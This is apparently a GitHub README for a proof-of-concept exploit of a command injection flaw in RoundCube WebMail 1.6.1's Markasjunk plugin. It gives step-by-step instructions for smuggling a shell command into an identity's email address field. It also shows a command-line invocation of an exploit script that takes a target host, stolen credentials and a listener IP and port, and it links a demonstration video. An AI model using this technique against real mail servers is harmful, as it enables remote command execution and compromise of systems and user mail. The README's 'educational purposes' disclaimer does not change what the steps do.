# RoundCube WebMail 1.6.1 - Markasjunk Vulnerability PoC

## Overview

This repository contains a Proof of Concept (PoC) for the `Markasjunk` plugin vulnerability in RoundCube WebMail version 1.6.1 (Used version for test). The vulnerability allows an attacker to execute arbitrary commands due to improper filtering of user inputs.

## Prerequisites

- Access as User (got credentials!)

## Manual Proof of Concept

1. Log in to the RoundCube WebMail interface.
2. Navigate to `Settings -> Identities`.
3. Modify the email address to include the payload:
    ```
    pwn&touch${IFS}test.txt&@pwn.com
    ```
4. Move any email to the "junk folder".
5. Verify that the command has been executed by checking for the presence of `test.txt` in the server's file system.
   [Reference](https://cyberthint.io/roundcube-markasjunk-command-injection-vulnerability/)

## Exploit use example

This PoC is for educational purposes only. Use it at your own risk. The author is not responsible for any damage caused by the misuse of this information.
```
./exploit vulnerablehost.com pwned@user.pwn PwnPassword! 127.0.0.1 1337
```

## PoC
[![](http://markdown-videos-api.jorgenkh.no/youtube/EmNSJb26hMA)](https://youtu.be/EmNSJb26hMA)
